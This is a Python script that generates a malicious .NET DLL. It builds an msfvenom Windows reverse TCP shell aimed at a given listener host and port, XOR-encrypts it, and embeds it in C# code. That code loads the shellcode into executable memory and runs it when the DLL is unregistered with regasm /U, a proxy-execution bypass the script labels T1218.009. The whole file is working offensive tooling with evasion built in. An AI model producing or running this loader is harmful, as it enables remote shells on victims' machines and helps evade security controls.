#!/usr/bin/env python3
"""
Generate a .NET DLL with XOR-encrypted shellcode that runs when unregistered (regasm /U).

Usage:
  python3 regirock.py --lhost 10.10.15.170 --lport 443 --compile
"""

import os
import sys
import hashlib
import argparse
import subprocess
import tempfile
import shutil
import textwrap

def generate_shellcode(lhost: str, lport: int) -> bytes:
    if not shutil.which("msfvenom"):
        sys.exit("[-] msfvenom not found. Install Metasploit.")
    with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as tmp:
        temp_path = tmp.name
    cmd = [
        "msfvenom",
        "-p", "windows/x64/shell_reverse_tcp",
        f"LHOST={lhost}", f"LPORT={lport}",
        "-f", "raw", "-o", temp_path,
    ]
    print(f"[*] Generating shellcode: {' '.join(cmd)}")
    try:
        subprocess.run(cmd, check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        os.unlink(temp_path)
        sys.exit(f"[-] msfvenom failed:\n{e.stderr}")
    with open(temp_path, "rb") as f:
        data = f.read()
    os.unlink(temp_path)
    print(f"[+] Shellcode size: {len(data)} bytes")
    return data

def derive_key(lhost: str, lport: int) -> bytes:
    return hashlib.sha256(f"{lhost}:{lport}".encode()).digest()

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def generate_csharp_source(encrypted_sc: bytes, xor_key: bytes) -> str:
    sc_vals = []
    for i in range(0, len(encrypted_sc), 16):
        chunk = encrypted_sc[i:i+16]
        sc_vals.append(", ".join(f"0x{b:02x}" for b in chunk))
    sc_body = ",\n".join(sc_vals)

    key_vals = ", ".join(f"0x{b:02x}" for b in xor_key)

    return textwrap.dedent(f"""\
    using System;
    using System.Runtime.InteropServices;
    using System.Threading;

    public class RegAsmBypass
    {{
        private static byte[] encryptedShellcode = new byte[]
        {{
            {sc_body}
        }};
        private static byte[] xorKey = new byte[] {{ {key_vals} }};

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void Sleep(uint dwMilliseconds);

        private static void ExecuteShellcode()
        {{
            for (int i = 0; i < encryptedShellcode.Length; i++)
                encryptedShellcode[i] ^= xorKey[i % xorKey.Length];

            IntPtr exec = VirtualAlloc(IntPtr.Zero, (uint)encryptedShellcode.Length, 0x1000 | 0x2000, 0x40); // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
            if (exec == IntPtr.Zero) return;

            Marshal.Copy(encryptedShellcode, 0, exec, encryptedShellcode.Length);

            uint threadId;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, exec, IntPtr.Zero, 0, out threadId);
            if (hThread != IntPtr.Zero)
            {{
                WaitForSingleObject(hThread, 0xFFFFFFFF); // INFINITE
            }}

            VirtualFree(exec, 0, 0x8000); // MEM_RELEASE
        }}

        [ComUnregisterFunction]
        public static void UnRegisterClass(Type t)
        {{
            Sleep(2000);
            ExecuteShellcode();
        }}
    }}
    """)

def find_csc() -> str:
    candidates = [
        "csc.exe",
        r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
    ]
    for cand in candidates:
        if shutil.which(cand):
            return cand
        if os.path.exists(cand):
            return cand
    return None

def main():
    parser = argparse.ArgumentParser(description="Generate .NET DLL for regasm /U (T1218.009)")
    parser.add_argument("--lhost", required=True, help="Listener IP")
    parser.add_argument("--lport", required=True, type=int, help="Listener port")
    parser.add_argument("--output-shellcode", default="encrypted_sc.bin", help="Raw encrypted shellcode")
    parser.add_argument("--output-source", default="RegAsmBypass.cs", help="C# source file")
    parser.add_argument("--output-dll", default="regirock.dll", help="Output DLL name")
    parser.add_argument("--compile", action="store_true", help="Compile the DLL")
    args = parser.parse_args()

    sc = generate_shellcode(args.lhost, args.lport)
    key = derive_key(args.lhost, args.lport)
    print(f"[*] XOR key: {key.hex()}")
    encrypted = xor_encrypt(sc, key)

    with open(args.output_shellcode, "wb") as f:
        f.write(encrypted)
    print(f"[+] Encrypted shellcode saved to {args.output_shellcode}")

    cs_code = generate_csharp_source(encrypted, key)
    with open(args.output_source, "w") as f:
        f.write(cs_code)
    print(f"[+] C# source written to {args.output_source}")

    if args.compile:
        csc = find_csc()
        if not csc:
            sys.exit("[-] csc.exe not found. Install .NET Framework SDK.")
        cmd = [
            csc,
            "/target:library",
            "/platform:anycpu",
            "/optimize+",
            f"/out:{args.output_dll}",
            args.output_source
        ]
        print(f"[*] Compiling: {' '.join(cmd)}")
        proc = subprocess.run(cmd, capture_output=True, text=True)
        if proc.returncode != 0:
            print("[-] Compilation failed:")
            print(proc.stderr)
            sys.exit(1)
        print(f"[+] Compiled DLL: {args.output_dll}")
        print("\n[+] Ready for regasm /U (user privileges):")
        print(f"    regasm.exe /U {args.output_dll}")
        print("    (The UnRegisterClass method will execute your shellcode)")
    else:
        print(f"\n[*] To compile manually:")
        csc = find_csc() or "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
        print(f"    {csc} /target:library /platform:anycpu /optimize+ /out:{args.output_dll} {args.output_source}")

if __name__ == "__main__":
    main()
